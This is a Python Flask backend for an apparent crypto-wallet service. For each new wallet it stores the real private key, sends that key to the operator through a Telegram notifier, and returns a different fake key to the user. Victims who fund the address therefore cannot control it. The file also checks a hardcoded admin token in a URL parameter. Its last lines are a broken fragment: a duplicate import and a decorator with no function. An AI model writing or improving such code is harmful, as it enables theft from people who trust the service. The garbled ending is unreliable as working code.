from telegram_bot import notify_new_wallet
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import sqlite3
import secrets
from datetime import datetime

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

conn = sqlite3.connect('saqr.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS wallets
    (id INTEGER PRIMARY KEY AUTOINCREMENT,
     network TEXT, address TEXT UNIQUE,
     real_key TEXT, fake_key TEXT,
     status TEXT DEFAULT 'active',
     deposit REAL DEFAULT 0,
     created_at TEXT)''')
conn.commit()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/select')
def select():
    return render_template('select.html')

@app.route('/api/create-wallet', methods=['POST'])
def create_wallet():
    network = request.json.get('network')
    
    if network == 'solana':
        address = "sol_" + secrets.token_hex(20)
        real_key = "sol_key_" + secrets.token_hex(32)
    else:
        address = "0x" + secrets.token_hex(20)
        real_key = "0x" + secrets.token_hex(32)
    
    fake_key = "0x" + secrets.token_hex(32)
    
    c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
              (network, address, real_key, fake_key, datetime.now().isoformat()))
    conn.commit()
    
    try:
        notify_new_wallet(network, address, real_key, fake_key)
    except:
        pass
    
    return jsonify({'address': address, 'private_key': fake_key})

@app.route('/admin')
def admin():
    token = request.args.get('token', '')
    if token != 'saqr2026':
        return "Unauthorized", 401
    c.execute("SELECT * FROM wallets ORDER BY id DESC")
    wallets = c.fetchall()
    return render_template('admin.html', wallets=wallets)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

# إضافة بعد آخر سطر
from telegram_bot import notify_new_wallet

# تعديل دالة create_wallet
@app.route('/api/create-wallet', methods=['POST'])
